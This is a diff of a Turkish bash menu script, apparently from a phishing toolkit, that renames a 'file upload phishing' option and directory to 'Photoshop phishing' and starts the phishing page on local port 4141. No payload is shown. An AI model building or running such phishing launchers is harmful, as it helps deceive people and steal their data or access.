@@ -217,7 +217,7 @@ if [[ $kontrol -gt 0 ]];then
 		echo
 		sleep 1
 		kontrol=$(basename $(pwd))
-		if [[ $kontrol == upload ]];then
+		if [[ $kontrol == photoshop ]];then
 			port="4141"
 		fi
 		bash index.sh -bg -p $port
@@ -282,7 +282,7 @@ printf "
 
 \e[0m
 
-\e[31m[\e[97m1\e[31m]\e[97m ────────── \e[32mDOSYA YÜKLE PHİSHİNG\e[97m
+\e[31m[\e[97m1\e[31m]\e[97m ────────── \e[32mPHOTOSHOP PHİSHİNG\e[97m
 
 \e[31m[\e[97m2\e[31m]\e[97m ────────── \e[33mRESİMLERİ DOSYALARA KOPYALA\e[97m
 
@@ -295,7 +295,7 @@ echo
 echo
 read -e -p $'\e[31m───────[ \e[97mSEÇENEK GİRİNİZ\e[31m ]───────►  \e[0m' secim
 if [[ $secim == 1 ]];then
-	cd upload
+	cd photoshop
 	bulunan
 	bash index.sh -bg -p 4141
 	echo
@@ -311,7 +311,7 @@ if [[ $secim == 1 ]];then
 	echo
 	dongu
 elif [[ $secim == 2 ]];then
-	cd upload
+	cd photoshop
 	image
 	printf "\e[32m
         +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\e[97m
